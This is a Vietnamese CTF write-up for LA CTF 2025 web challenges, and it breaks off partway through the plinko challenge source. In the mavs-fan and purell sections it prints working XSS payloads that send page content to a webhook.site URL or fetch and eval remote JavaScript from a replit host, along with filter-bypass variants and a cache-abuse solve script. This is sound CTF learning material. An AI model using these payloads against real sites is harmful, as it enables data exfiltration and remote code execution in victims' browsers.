---
title: "LA CTF 2025"
description: "LA CTF 2025"
summary: "LA CTF 2025 writeup"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-02-14
draft: false
cover: ../../post/lactf2025/feature.gif

authors:
  - winky
---



Giải này mình bị skill issue nên chỉ giải được có 4 bài hic

## lucky-flag

![image](https://hackmd.io/_uploads/BJDaG-AFke.png)

### Hints 

No hint

### Solution

Challenge cho mình một trang web sau 

![image](https://hackmd.io/_uploads/Sy3Yzd4Kyx.png)

Đầu tiên mình mở devtool và đọc được source như sau

![image](https://hackmd.io/_uploads/S1pjzuNtkg.png)

Phân tích source : 

* flag sẽ được mã hóa vào biến enc và trong các button trên chỉ có 1 button đúng mà khi mình bấm vào sẽ giải mã biến enc và trả ra cho ta flag. 
* Khi này mình chỉ cần giải mã biến enc bằng Node JS là xong 

![image](https://hackmd.io/_uploads/r1HJXdVtye.png)

`Flag : lactf{w4s_i7_luck_0r_ski11}`

## I Spy...

![image](https://hackmd.io/_uploads/rJI84bRYJg.png)

### Hints

Scavenger Hunt 

### Solution

Challenge cho mình một trang web sau thuộc dạng scavenger hunt 

![image](https://hackmd.io/_uploads/SJ-XLu4tyx.png)

Web cho sẵn token đầu tiên là B218B51749AB9E4C669E4B33122C8AE3

![image](https://hackmd.io/_uploads/ry07LuVt1l.png)

Vì token nằm trong source nên mình mở dev tool và thấy được token tiếp theo

![image](https://hackmd.io/_uploads/S1cN8OEKye.png)

Token: 66E7AEBA46293C88D484CDAB0E479268

![image](https://hackmd.io/_uploads/BJr_IOVYkl.png)

Vì token nằm ở console nên mình mở tab console và thấy token 

![image](https://hackmd.io/_uploads/BkkYLuEY1g.png)

Token: 5D1F98BCEE51588F6A7500C4DAEF8AD6

![image](https://hackmd.io/_uploads/B1E5Lu4t1e.png)

Vì token nằm ở stylesheet nên mình xem source CSS 

![image](https://hackmd.io/_uploads/rkPjLd4Y1e.png)

Token: 29D3065EFED4A6F82F2116DA1784C265

![image](https://hackmd.io/_uploads/Hyw0LdNF1l.png)

Vì token nằm ở code javascript nên mình tiếp tục xem source của file js 

![image](https://hackmd.io/_uploads/HyY3L_NYyx.png)

Token: 9D34859CA6FC9BB8A57DB4F444CDAE83

![image](https://hackmd.io/_uploads/SkyeD_EFJx.png)

Ở đây token nằm ở header nên mình xem log trong burpsuite và thấy răng có một header X-Token có thứ mình cần tìm 

![image](https://hackmd.io/_uploads/rJQ-PO4Fyl.png)

Token: BF1E1EAA5C8FDA6D9D0395B6EA075309

![image](https://hackmd.io/_uploads/H1LmvuEFke.png)

Vì token nằm trong cookie nên mình tiếp tục xem log burpsuite và thấy có a-token có chứa token 

![image](https://hackmd.io/_uploads/H1cVDuNYJx.png)

Token: 647E67B4A8F4AA28FAB602151F1707F2


![image](https://hackmd.io/_uploads/r1lOw_4KJe.png)

Một nơi mà robots sẽ không được vào thì chắc chắn đó là file robots.txt

![image](https://hackmd.io/_uploads/r11tP_VKJg.png)

Khi mình vào thì nó lại bị chặn bởi một file a-magical-token.txt

![image](https://hackmd.io/_uploads/SJcFwdNKyl.png)

Token: 3FB4C9545A6189DE5DE446D60F82B3AF

![image](https://hackmd.io/_uploads/rkjcv_EKkx.png)

Một trang mà google sẽ index trang web của mình là sitemap.xml

![image](https://hackmd.io/_uploads/SkDswuEt1x.png)

Token: F1C20B637F1B78A1858A3E62B66C3799

![image](https://hackmd.io/_uploads/BkDhPO4KJx.png)

Thực hiện một DELETE request thì mình có nhiều cách và mình có thể sử dụng Burpsuite

![image](https://hackmd.io/_uploads/SJ9RDOVKkg.png)

Token: 32BFBAEB91EFF980842D9FA19477A42E

![image](https://hackmd.io/_uploads/ryIgu_4Y1e.png)

Một bản ghi của domain nên mình sử dụng nslookup để tìm kiếm

![image](https://hackmd.io/_uploads/rJrZ_uEt1e.png)

Token: 7227E8A26FC305B891065FE0A1D4B7D4

![image](https://hackmd.io/_uploads/BkNf_d4Kkl.png)

`lactf{1_sp0773d_z_t0k3ns_4v3rywh3r3}`

## mavs-fan

![image](https://hackmd.io/_uploads/Skn4GNAFJl.png)

### Source

https://drive.google.com/file/d/1DrwBklG_wQUJ9H8aajvHfxznyU277nCV/view?usp=sharing

### Hints

XSS 

### Solution

Challenge cho mình một trang web như sau 

![image](https://hackmd.io/_uploads/BJ9heoDYke.png)

Và một trang bot 

![image](https://hackmd.io/_uploads/S1iB7ovFyl.png)

Sau khi đọc source của web và vì web có bot nên mình nghĩ sẽ có lỗ hổng về XSS nên mình thử payload sau 

```html
<img src=x onerror=alert(1); />
```

Web chạy được cả code js mình truyền vào từ đó mình confirm có dính XSS thật

![image](https://hackmd.io/_uploads/Syb8bsvYyl.png)

Tiếp theo mình lookup mục tiêu và thấy rằng endpoint /admin sẽ trả ra flag nếu ở cookie có secret là ADMIN_SECRET. 

```js
app.get('/admin', (req, res) => {
    if (!req.cookies.secret || req.cookies.secret !== ADMIN_SECRET) {
        return res.redirect("/");
    }
    return res.json({ trade_plan: FLAG });
});
```

Lúc đầu thì mình định lấy cookie của admin nhưng mà sau khi đọc note của challenge `Note that the admin cookie is HttpOnly!` thì mình biết là không đọc được. Lúc này mình suy nghĩ một hồi thì chỉ cần redirect con bot vào trang /admin và lấy content thôi. Vì flag cũng nằm trên content web đó mà/ 

Nên mình sẽ xây dựng được payload như sau 

```html
<img src=x onerror="fetch('https://mavs-fan.chall.lac.tf/admin').then(response => response.text()).then(data => console.log(data))" />
```

Khi chạy thì ta lấy được content của page như sau 

![image](https://hackmd.io/_uploads/BJyfzjvtkl.png)

Sau đó mình xây dựng payload để catch webhook như sau. Vì một số vấn đề về newline nên mình sẽ sử dụng JSON.stringify để format cái data mình nhận.

```html
<img src=x onerror="fetch('https://mavs-fan.chall.lac.tf/admin').then(response => response.text()).then(data => fetch('https://webhook.site/e5799148-b55d-49e8-b89b-987a28176905/?content='+JSON.stringify(data)))" />
```

Và mình lấy được content của page

![image](https://hackmd.io/_uploads/S1fGQsDYyg.png)

Submit trang web vừa nãy và mình có flag từ admin bot

![image](https://hackmd.io/_uploads/S10QQswYkx.png)

`Flag: lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}`

## purell

### Source

https://drive.google.com/file/d/1ghLvlRbVitEwd8uBCLW2QUU4uW9Vu1ok/view?usp=sharing

### Hints

XSS

### Solution 

![image](https://hackmd.io/_uploads/HyTrX1TFJl.png)

Challenge cho mình một trang web như sau

![image](https://hackmd.io/_uploads/SkboV0YYyg.png)

Và một trang bot

![image](https://hackmd.io/_uploads/H1Z34AtFJe.png)

Source của web : 
 
<details>
<summary>app_distribution.js</summary>
    
```js
const express = require('express');
const cookieParer = require('cookie-parser');
const path = require('path');
const fs = require('fs');

const port = process.env.PORT ?? 3000;
const testflag = (n) => `purell-token{xss_guru_${n}}`;

const app = express();

app.use(cookieParer());
app.use('/', express.static(path.join(__dirname, 'site')));


// id, flag, flagpart, and adminpw have been changed from the actual challenge
const levels = [
  {
    id: 'start',
    name: 'A Friendly Warmup',
    flag: 'TOKEN1',
    flagpart: 'hi',
    adminpw: 'ADMIN1',
    sanitizer: (html) => html
  },
  {
    id: 'two',
    name: 'no scripts allowed fr fr',
    flag: 'TOKEN2',
    flagpart: 'hi',
    adminpw: 'ADMIN2',
    sanitizer: (html) => html.includes('script') || html.length > 150 ? 'nuh-uh' : html
  },
  {
    id: 'three',
    name: 'NO MORE XSS PLEASE',
    flag: 'TOKEN3',
    flagpart: 'hi',
    adminpw: 'ADMIN3',
    sanitizer: (html) => html.includes('script') || html.includes('on') || html.length > 150 ? 'nuh-uh' : html
  },
  {
    id: 'four',
    name: 'ok now yall are cooked, no more scripts or on',
    flag: 'TOKEN4',
    adminpw: 'ADMIN4',
    flagpart: 'hi',
    sanitizer: (html) => html.toLowerCase().replaceAll('script', '').replaceAll('on', '')
  },
  {
    id: 'five',
    name: 'screw it no more html for yall',
    flag: 'TOKEN5',
    flagpart: 'hi',
    adminpw: 'ADMIN5',
    sanitizer: (html) =>
      html
        .toLowerCase().replaceAll('script', '').replaceAll('on', '')
        .replaceAll('>', '')
  },
  {
    id: 'six',
    name: 'no whitespace, no nothing',
    flag: 'TOKEN6',
    flagpart: 'hi',
    adminpw: 'ADMIN6',
    sanitizer: (html) =>
      html
        .toLowerCase().replaceAll('script', '').replaceAll('on', '')
        .replaceAll('>', '')
        .replace(/\s/g, '')
  },
  {
    id: 'seven',
    name: 'no parenthesis :megamind:',
    flag: 'TOKEN7',
    flagpart: 'hi',
    adminpw: 'ADMIN7',
    sanitizer: (html) =>
      html
        .toLowerCase().replaceAll('script', '').replaceAll('on', '')
        .replaceAll('>', '')
        .replace(/\s/g, '')
        .replace(/[()]/g, '')
  },
  {
    id: 'end',
    name: 'Congrats on receiving all the flags parts! Submit for points.',
    flag: '',
    adminpw: 'ADMIN8',
    flagpart: 'hi',
    sanitizer: (html) => ''
  }
];

const lmap = new Map(levels.map((l, i) => ([l.id, { n: i, ...l }])));
console.log(new Map(levels.map((l, i) => ([l.id, l.adminpw]))))
app.get('/level/:levelid', (req, res) => {
  const level = lmap.get(req.params.levelid);
  const html = req.query.html ?? '';

  if (!level) {
    res.redirect('/level/start');
    return;
  }
  const isAdmin = req.cookies.adminpw === level.adminpw;
  if (!isAdmin && req.cookies.adminpw) {
    res.clearCookie("adminpw");
    res.send("Adminbot visited wrong endpoint. If you are not the admin bot, reload the page.")
    return;
  }
  const template = fs.readFileSync(path.join(__dirname, 'site/level.html')).toString();
  const resp = template
    .replaceAll('$level$', level.n.toString())
    .replaceAll('$flag$', isAdmin ? level.flag : testflag(level.n))
    .replaceAll('$sanitizer$', level.sanitizer.toString())
    .replaceAll('$name$', level.name)
    .replaceAll('$html$', level.sanitizer(html));
  res.send(resp);
});

app.get('/flag', (req, res) => {
  const flag = req.query.flag;

  if (flag.includes('xss_guru')) {
    res.send('You seem to have submitted the testing token, please send a link to the admin bot and submit the real token instead');
    return;
  }

  for (let i = 0; i < levels.length; ++i) {
    const level = levels[i];
    if (level.flag === flag) {
      const template = fs.readFileSync(path.join(__dirname, 'site/nextlevel.html')).toString();
      res.send(template.replaceAll('$redir$', `/level/${levels[i + 1].id}`).replaceAll('$part$', `${i + 1}`).replaceAll("$flagpart$", `${levels[i].flagpart}`));
      return;
    }
  }
  res.send('Incorrect token');
});

app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
```
    
</details>
 


Sau khi đọc source thì mình xác định được nhiệm vụ là phải vượt qua 7 level của web mới nhận được flag. Trong đó để sang được level tiếp theo chúng ta cần token từ admin bot theo đúng level đó. Mà các token lại nằm trong cookie của admin bot nên mình nghĩ bài này chỉ là bypass XSS thôi. 

Chúng ta dến với level 0 : Ở đây trang web sẽ in ra tất cả những gì chúng ta nhập và không purify gì cả.

![image](https://hackmd.io/_uploads/Sk1xSCtY1l.png)

Đầu tiên, mình thử `<script>alert(1)</script>` và mình confirm có thể chạy script trên đây. 

![image](https://hackmd.io/_uploads/SyszrRYK1e.png)



Để có thể lấy token thì ta sẽ lấy toàn bộ HTML của trang web level 0 mà admin sẽ vào thông qua XSS. Để lấy thì ta có thể sử dụng document.body.innerHTML. Vì một số yếu tố về newline mà ta cần chuyển sang dạng khác bằng encodeURIComponent hoặc JSON.stringify. 

```html
<script>console.log(encodeURIComponent(document.body.innerHTML))</script>
```


![image](https://hackmd.io/_uploads/ryscUCYt1e.png)

Và cuối cùng ta sẽ build được một payload sau để lấy content của web

```html
<script>fetch('https://webhook.site/e5799148-b55d-49e8-b89b-987a28176905/?c='+encodeURIComponent(document.body.innerHTML))</script>
```

![image](https://hackmd.io/_uploads/BJq-v0Ftke.png)

Gửi cho admin để vào và ta có purell_token của level 0

![image](https://hackmd.io/_uploads/BkL8D0KKkx.png)



Submit purell-token{gu4u_of_exf1l} và mình có part 1 của flag : lactf{1_4m_z3_

![image](https://hackmd.io/_uploads/BJ-_DAKFkx.png)

Đến với level 1, thì mình thấy rằng trang web sẽ filter chữ script và payload không được quá 150 kí tự. 
![image](https://hackmd.io/_uploads/rJ_pPCYF1x.png)

Vì payload của level 0 cũng không quá 150 nên mình có thể bypass bằng Script hoặc img onerror như sau

```html 
<img src=x onerror=fetch('https://webhook.site/e5799148-b55d-49e8-b89b-987a28176905/?c='+encodeURIComponent(document.body.innerHTML)) />
```

Khi đó ta sẽ lấy được token từ admin bot

![image](https://hackmd.io/_uploads/SyaS_CYK1l.png)

Submit purell-token{scr7ptl355_m3n4c3} và mình có part 2 của flag : b3s7_x40ss_

Đến level 2 web sẽ cấm giống level 1 nhưng cấm luôn cả chữ on nên mình không thể xài img onerror được nữa.

![image](https://hackmd.io/_uploads/S1-_ORttJx.png)

Nhưng mình lại có thể xài Script như đã đề cập ở trên và chúng ta có payload như sau : 

```html
<Script>fetch('https://webhook.site/e5799148-b55d-49e8-b89b-987a28176905/?c='+encodeURI(document.body.innerHTML))</Script>
```

Khi đó ta sẽ lấy được token của level 2

![image](https://hackmd.io/_uploads/BJ1g50tFyl.png)

Submit purell-token{XSS_IS_UNSTOPPABLE_RAHHHH} và mình có part 3 của flag : h4nd_g34m_

Đến với level 3, web sẽ lowercase payload và replace các từ script và on trong payload nhưng lại không giới hạn ký tự

![image](https://hackmd.io/_uploads/S1ffcCtKyx.png)

Đến đây thì mình không thể xài được Script luôn. Nhưng vi web replace nên mình có thể double lên và bypass được oonn => on. Và mình có thể tự host payload và dùng script src hoặc dùng fetch eval để chạy như sau

![image](https://hackmd.io/_uploads/BJrB6RtKke.png)

Vì web không chặn samesite nên mình có thể fetch được dễ dàng

```html 
<img src=x oonnerror="fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js').then(response=>response.text()).then(data=>coonnsole.log(data))" />
```

![image](https://hackmd.io/_uploads/S1YHh0KF1l.png)

Và từ đó ta có payload sau để lấy token

```html
<img src=x oonnerror="fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js').then(r=>r.text()).then(data=>eval(data))" />
```

![image](https://hackmd.io/_uploads/BkCGRAKt1g.png)

Submit purell-token{a_l7l_b7t_0f_m00t4t70n} và mình có part 4 của flag : 4cr0ss_411_t1m3

Đến với level 4 ở đây web replace hết kí tự '>' dùng cho đóng tag và mình không thể double nó lên hay làm gì được. 

![image](https://hackmd.io/_uploads/rJwI0AFtye.png)

Sau một hồi tìm kiếm thì mình có thể bypass bằng cách sử dụng HTML Entities 

https://www.toptal.com/designers/htmlarrows/

![image](https://hackmd.io/_uploads/HyH-by5K1l.png)

Từ đó ta có payload sau để lấy token

```html
<img src=x oonnerror="fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js').then(r=&gt;r.text()).then(data=&gt;eval(data))" /
```

![image](https://hackmd.io/_uploads/HJtc-1qYJx.png)


Submit purell-token{html_7s_m4lf0rmed_bu7_no7_u} và mình có part 5 của flag : _4nd_z_

Tới level 5, ở đây web cấm luôn các khoảng trắng.

![image](https://hackmd.io/_uploads/BkO8zk5YJg.png)

Vì thế mình chỉ cần xóa các dấu cách thừa không cần thiết và các attribute có thể dễ dàng bypass bằng dấu /

```html 
<img/src="x"/oonnerror="fetch('https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js').then(r=&gt;r.text()).then(data=&gt;eval(data))"/
```

![image](https://hackmd.io/_uploads/HykFGJ9Yyx.png)


Submit purell-token{wh3n_th3_imp0st4_i5_5u5_bu7_th3r35_n0_sp4c3} và mình có part 6 của flag : un1v3rs3

Tiếp đến level 6 web cấm luôn cả ( ,[, ] và )

![image](https://hackmd.io/_uploads/BkR5GkqKkg.png)

Lúc này mình chỉ cần thay HTML entities như nãy là xong

![image](https://hackmd.io/_uploads/H15J7ycYyx.png)

Và chúng ta có payload như sau : 

```html
<img/src="x"/oonnerror="fetch&#x28;'https://9288206c-d9c3-4819-83d6-28c85eb8d228-00-1nbm4b0t9pkbs.spock.replit.dev/exploit.js'&#x29;.then&#x28;r=&gt;r.text&#x28;&#x29;&#x29;.then&#x28;data=&gt;eval&#x28;data&#x29;&#x29;" /
```

![image](https://hackmd.io/_uploads/rk2c7J9Ykg.png)

Submit purell-token{y0u_4r3_th3_0n3_wh0_c4ll5} và mình có part 7 của flag : _1nf3c71ng_3v34y_1}

![image](https://hackmd.io/_uploads/ry-67JqFJe.png)

Và chúng ta đã vượt qua 7 level của challenge này và có flag sau : 

`Flag: lactf{1_4m_z3_b3s7_x40ss_h4nd_g34m_4cr0ss_411_t1m3_4nd_z_un1v3rs3_1nf3c71ng_3v34y_1}`

Sau đây là các bài mình làm thêm 
         
## chessbased

![image](https://hackmd.io/_uploads/By7D_V0K1e.png)

### Source 

https://drive.google.com/file/d/1I0QfbX2bZvblRO_vYjmdgXNFxKj2dimh/view?usp=sharing

### Hints

Insecure route

### Solution

Challenge cho mình một trang web như sau

![image](https://hackmd.io/_uploads/SkaoQivYkg.png)

Và source của web 

<details>
<summary>app.js</summary>
    
```js
const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');
const { openings } = require('./openings.js');

const port = process.env.PORT ?? 3000;
const flag = process.env.FLAG ?? 'lactf{owo_uwu}';
const adminpw = process.env.ADMINPW ?? 'adminpw';
const challdomain = process.env.CHALLDOMAIN ?? 'http://localhost:3000/';

openings.forEach((op) => (op.premium = false));
openings.push({ premium: true, name: 'flag', moves: flag });

const lookup = new Map(openings.map((op) => [op.name, op]));

app = express();

app.use(cookieParser());
app.use('/', express.static(path.join(__dirname, '../frontend/dist')));
app.use(express.json());

app.get('/render', (req, res) => {
  const id = req.query.id;
  const op = lookup.get(id);
  res.send(`
    <p>${op?.name}</p>
    <p>${op?.moves}</p>
  `);
});

app.post('/search', (req, res) => {
  if (req.headers.referer !== challdomain) {
    res.send('only challenge is allowed to make search requests');
    return;
  }
  const q = req.body.q ?? 'n/a';
  const hasPremium = req.cookies.adminpw === adminpw;
  for (const op of openings) {
    if (op.premium && !hasPremium) continue;
    if (op.moves.includes(q) || op.name.includes(q)) {
      return res.redirect(`/render?id=${encodeURIComponent(op.name)}`);
    }
  }
  return res.send('lmao nothing');
});

app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
```
    
</details>

Ở đây khi ta tìm một keyword thì web sẽ trả ra cho ta một opening tương ứng

![image](https://hackmd.io/_uploads/ryVmYN0FJg.png)

Đọc lại source thì web sẽ gọi endpoint /search của backend và sau đó redirect đến /render cũng của backend. Nên mình có thể sử dụng /render để tìm opening có id từ query param.

![image](https://hackmd.io/_uploads/r1WUW3wFkg.png)

Lúc này thì mình vào thẳng /render luôn vì không bị filter hasPremium và search id flag và chúng ta có flag.

![image](https://hackmd.io/_uploads/Hy4rZnvF1g.png)

`Flag: lactf{t00_b4s3d_4t_ch3ss_f3_kf2}`

## cache it to win it!

![image](https://hackmd.io/_uploads/Bktu1YyqJe.png)

### Source

https://drive.google.com/file/d/1Y-N4kGFBU0a9Cgz35utGccLY-vFx5ZQ4/view?usp=sharing

### Hints

Null character bypass

### Solution

Challenge cho mình một trang web như sau

![image](https://hackmd.io/_uploads/H1qOrlFFJg.png)

Và đây là source của trang web 

```python
from flask import Flask, request, jsonify, g, Blueprint, Response, redirect
import uuid
from flask_caching import Cache
import os
import mariadb
import datetime

app = Flask(__name__)

# Configure caching (simple in-memory cache)
app.config["CACHE_TYPE"] = "RedisCache"
app.config["CACHE_REDIS_HOST"] = os.getenv("CACHE_REDIS_HOST", "redis")
app.config["CACHE_DEFAULT_TIMEOUT"] = 604800  # Cache expires in 7 days
cache = Cache(app)


def get_db_connection():
    try:
        conn = mariadb.connect(
            host=os.getenv("DATABASE_HOST"),
            user=os.getenv("DATABASE_USER"),
            password=os.getenv("DATABASE_PASSWORD"),
            database=os.getenv("DATABASE_NAME"),
        )
        return conn
    except mariadb.Error as e:
        return {"error": str(e)}


# I'm lazy to do this properly, so enjoy this ChatGPT'd run_query function!
def run_query(query, params=None):
    conn = get_db_connection()
    if isinstance(conn, dict):
        return conn

    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute(query, params or ())

        conn.commit()
        result = {
            "success": True,
            "affected_rows": cursor.rowcount,
            "result": cursor.fetchall(),
        }

        return result
    except mariadb.Error as e:
        print("ERROR:", e, flush=True)
        return {"error": str(e)}
    finally:
        cursor.close()
        conn.close()


@app.route("/")
def index():
    if "id" not in request.cookies:
        unique_id = str(uuid.uuid4())
        run_query("INSERT INTO users VALUES (%s, %s);", (unique_id, 0))
    else:
        unique_id = request.cookies.get("id")
        res = run_query("SELECT * FROM users WHERE id = %s;", (unique_id,))
        print(res, flush=True)
        if "affected_rows" not in res:
            print("ERRROR:", res)
            return "ERROR"
        if res["affected_rows"] == 0:
            unique_id = str(uuid.uuid4())
            run_query("INSERT INTO users VALUES (%s, %s);", (unique_id, 0))

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>{unique_id}</title>
    </head>
    <body>
        <h1>Your unique account ID: {unique_id}</h1>
        <p><a href="/check?uuid={unique_id}">Click here to check if you are a winner!</a></p>
    </body>
    </html>
    """
    r = Response(html)
    r.set_cookie("id", unique_id)
    return r


def normalize_uuid(uuid: str):
    uuid_l = list(uuid)
    i = 0
    for i in range(len(uuid)):
        uuid_l[i] = uuid_l[i].upper()
        if uuid_l[i] == "-":
            uuid_l.pop(i)
            uuid_l.append(" ")

    return "".join(uuid_l)


def make_cache_key():
    return f"GET_check_uuids:{normalize_uuid(request.args.get('uuid'))}"[:64]  # prevent spammers from filling redis cache


check_bp = Blueprint("check_bp", __name__)


@check_bp.route("/check")
@cache.cached(timeout=604800, make_cache_key=make_cache_key)
def check():
    user_uuid = request.args.get("uuid")
    if not user_uuid:
        return {"error": "UUID parameter is required"}, 400

    run_query("UPDATE users SET value = value + 1 WHERE id = %s;", (user_uuid,))
    res = run_query("SELECT * FROM users WHERE id = %s;", (user_uuid,))
    g.cache_hit = False
    if "affected_rows" not in res:
        print("ERRROR:", res)
        return "Error"
    if res["affected_rows"] == 0:
        return "Invalid account ID"
    num_wins = res["result"][0]["value"]
    if num_wins >= 100:
        return f"""CONGRATS! YOU HAVE WON.............. A FLAG! {os.getenv("FLAG")}"""
    return f"""<p>Congrats! You have won! Only {100 - res["result"][0]["value"]} more wins to go.</p>
    <p>Next attempt allowed at: {(datetime.datetime.now() + datetime.timedelta(days=7)).isoformat(sep=" ")} UTC</p><p><a href="/">Go back to the homepage</a></p>"""


# Hack to show to the user in the X-Cached header whether or not the response was cached
# How in the world does the flask caching library not support adding this header?????
@check_bp.after_request
def add_cache_header(response):
    if hasattr(g, "cache_hit") and not g.cache_hit:
        response.headers["X-Cached"] = "MISS"
    else:
        response.headers["X-Cached"] = "HIT"

    g.cache_hit = True

    return response


app.register_blueprint(check_bp)


# Debugging use for dev - remove before prod
# @app.route("/clear")
# def clear():
#     cache.clear()
#     return "cache cleared!"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

Phân tích : 

* Web sẽ lấy uuid từ url và được normalize thông qua hàm này

```python
def normalize_uuid(uuid: str):
    uuid_l = list(uuid)
    i = 0
    for i in range(len(uuid)):
        uuid_l[i] = uuid_l[i].upper()
        if uuid_l[i] == "-":
            uuid_l.pop(i)
            uuid_l.append(" ")

    return "".join(uuid_l)


def make_cache_key():
    return f"GET_check_uuids:{normalize_uuid(request.args.get('uuid'))}"[:64]  # prevent spammers from filling redis cache
```

sau đó update uuid sau khi normalize xuống 1 và khi xuống 0 thì cho ta flag

* Nhưng cache chỉ cho ta tiếp tục trừ sau 604800 giây tức là 7 ngày nhân cho 100 lần thì cũng gần 2 năm rồi :))

* Lúc này thì mình đọc lại hàm normalize thì mình phát hiện nó sẽ tách uuid bằng dấu '-' sau đó join lại với nhau

Ví dụ: 
02c6f360-a6ab-4db7-b271-07d62c358870 => 02C6F360a6AB4DB7b27107D62C358870

Sau đó server lại dùng 02C6F360a6AB4DB7b27107D62C358870 để cập nhật database

* Lúc này mình mới nhận ra là nếu thêm một dấu cách ở đằng sau thì sau khi normalize cũng sẽ ra chuỗi mình cần tìm nên mình thử thêm vào và counter đã trừ xuống.

![image](https://hackmd.io/_uploads/BkmgwxKtkx.png)

Ok ngon rồi thế thì chỉ cần spam 100 dấu cách là được nhưng có 1 vấn đề là nó chỉ lấy 64 kí tự đầu của chuỗi `f"GET_check_uuids:{normalize_uuid(request.args.get('uuid'))}"[:64]` nên mình chỉ spam đến 86 là ngừng rồi 

![image](https://hackmd.io/_uploads/Syh8DetKyx.png)

Lúc này mình mới thử các ký tự null xem sao và wow nó trừ xuống được

![image](https://hackmd.io/_uploads/Hy3OPlYFJl.png)

Từ đó mình có thể sử dụng %00 -> %20 mỗi cái 10 lần thì chắc chắn count down được từ 100 xuống 0 thôi

Và đây là solve script của mình : 

```python
import requests
url = "https://cache-it-to-win-it.chall.lac.tf/check?uuid=ad53251d-3cc9-41b2-af95-44f7b787ce06"
for i in range(20):
    url2 = url
    for j in range(10):
        url2 += str('%'+'%02d'%i)
        r = requests.get(url2)
        print(r.text)
```

Sau khi chạy thì ta có flag

![image](https://hackmd.io/_uploads/Sy6cPetKyx.png)

`Flag: lactf{my_c4ch3_f41l3d!!!!!!!}`

## plinko

![image](https://hackmd.io/_uploads/HJwQ45y9yg.png)

### Source

https://drive.google.com/file/d/1qgN9ZaWqeuyOYgj4VkZBpBuFV9QOLFlV/view?usp=sharing

### Hints

Hijack Web socket

### Solution

Challenge cho mình một trang web sau 

![image](https://hackmd.io/_uploads/BkvYEycK1l.png)

Web này mô phỏng trò chơi plinko như sau

![image](https://hackmd.io/_uploads/BJ-JHJqtke.png)

Và đây là source

```js
// server.js
const Matter = require('matter-js');
const express = require('express');
const WebSocket = require('ws');
const session = require('express-session')
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cors = require('cors');
const app = express();
app.use(cors());
const flag = process.env.FLAG || 'lactf{test_flag}';

const port = 3000;

const SECRET_KEY = crypto.randomBytes(16).toString('hex');
app.use(express.json());
const sessionMiddleware = session({
    secret: SECRET_KEY,
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
  });
app.use(sessionMiddleware);
app.use(express.static("public", {index: false})); // Serve static files

const users = {};

// Signup endpoint
app.post("/signup", (req, res) => {
    const { username, password } = req.body;
    if (!username || !password || typeof(username)!=='string' || typeof(password)!=='string') return res.status(400).json({ error: "Missing fields" });
    if (users[username]) return res.status(400).json({ error: "User already exists" });

    users[username] = { "password": password, points: 10000}; // Store user
    req.session['user'] = username;
    res.json({ message: "Signup successful" });
});

// Login endpoint
app.post("/login", (req, res) => {
    const { username, password } = req.body;
    if (typeof(username)!=='string' || typeof(password)!=='string' || !users[username] || users[username].password !== password) {
        return res.status(401).json({ error: "Invalid credentials" });
    }
    req.session['user'] = username;
    res.json({ message: "Login successful"});
});

const timeInterval = 16.666666666; // how often the ball's position is updated
const g = 0.27777777777; // our gravity constant

// the set positions of all pins
const pinPositions = [];
for (let row=5; row<16; row++) {
    const middleSpace = 65*(row-1);
    const frontPad = (1000-middleSpace)/2
    for (let pin=0; pin<row; pin++) {
        pinPositions.push({'x': pin*65+frontPad, 'y': (row-4)*85-10});
    }
}
pinPositions.push({'x': 190, 'y': 480});
pinPositions.push({'x': 810, 'y': 480});
pinPositions.push({'x': 500, 'y': 1000});
const leftWall = Matter.Bodies.rectangle(190, 480, 1, 1100, {isStatic: true, angle: Math.PI/8.6});
const rightWall = Matter.Bodies.rectangle(810, 480, 1, 1100, {isStatic: true, angle: -Math.PI/8.6});

function calcPositionDiff(time, v1) {
    let t = 0;
    let v = v1+g;
    let pos = 0;
    while (t<=time-1) {
        pos+=v;
        v+=g;
        t+=timeInterval;
    }
    return pos;
}

function socketSend(ws, data) {
    try {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, (err) => {
                if (err) {
                    console.error("Error sending message:", err);
                }
            });
        } else {
            console.error("WebSocket is not open. ReadyState:", ws.readyState);
        }
    } catch (error) {
        console.error("WebSocket send failed:", error);
    }
}

// validation function; checks that the trajectory the user passed in matches with the velocity vector from the previous collision
function validatePosition(prevCollision, prevVelo, prevTime, currCollision, currVelo, currTime) {
    if (typeof(prevTime)!=='number' || typeof(currTime)!=='number') return false;
    if (!('x' in prevCollision) || !('y' in prevCollision) || !('x' in prevVelo) || !('y' in prevVelo) || !('x' in currCollision) || !('y' in currCollision) || !('x' in currVelo) || !('y' in currVelo)) return false;
    if (Math.abs(prevVelo.x-currVelo.x)>0.001) {
        return false;
    }
    const t = (currTime-prevTime);
    const posChange = calcPositionDiff(t, prevVelo.y);
    const veloChange = timeInterval*t/1000;

    const newYVelo = veloChange+prevVelo.y;
    const newYPos = posChange+prevCollision.y;

    if (Math.abs(newYVelo-currVelo.y)>0.001) {

        return false;
    }
    if (Math.abs(newYPos-currCollision.y)>0.001) {
        return false;
    }
    return true;
}

function hittingWall(position) {
    const ball = Matter.Bodies.circle(position.x, position.y, 10);
    const hitLeft = Matter.Collision.collides(ball, leftWall);
    const hitRight = Matter.Collision.collides(ball, rightWall);
    return hitLeft!==null || hitRight!==null;
}

const wss = new WebSocket.Server({ noServer: true });
// landing zone money multipliers
const multipliers = [
    10.0, 6.24, 3.66, 1.98, 0.95, 0.39, 0.12, 0.02, 0.0015, 0.0, 
    0.0015, 0.02, 0.12, 0.39, 0.95, 1.98, 3.66, 6.24, 10.0
  ];
wss.on('connection', (ws, req) => {
  try {
    let prevCollision;
    let prevVelo;
    let prevTime;

    ws.on('message', (message) => {
        let msgData;
       
        try {
            msgData = JSON.parse(message);
        }
        catch(e) {
